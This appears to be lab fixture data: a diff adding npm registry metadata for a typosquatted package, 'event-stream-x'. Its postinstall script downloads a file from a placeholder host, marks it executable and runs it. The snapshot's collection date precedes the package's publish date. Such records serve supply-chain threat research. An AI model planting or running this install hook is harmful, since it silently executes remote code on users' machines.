@@ -1,0 +1,20 @@
+{
+  "_meta": {
+    "source": "npm registry metadata mirror + build log（lab 快照）",
+    "collected_at": "2026-11-02T04:10:00Z"
+  },
+  "packages": [
+    {
+      "name": "event-stream-x",
+      "version": "1.2.3",
+      "author": "ev-tsream (typosquat of event-stream)",
+      "published_at": "2026-11-03T21:40:00Z",
+      "dist_tarball": "https://registry.npmjs.org/event-stream-x/-/event-stream-x-1.2.3.tgz",
+      "scripts": {
+        "postinstall": "node -e \"require('https').get('hxxp://cdn-metrics.example/b',r=>{const f=require('fs').createWriteStream('/tmp/.x');r.pipe(f);f.on('finish',()=>require('child_process').exec('chmod +x /tmp/.x && /tmp/.x'))})\""
+      },
+      "weekly_downloads": 3,
+      "maintainer_email_domain": "protonmail.example"
+    }
+  ]
+}
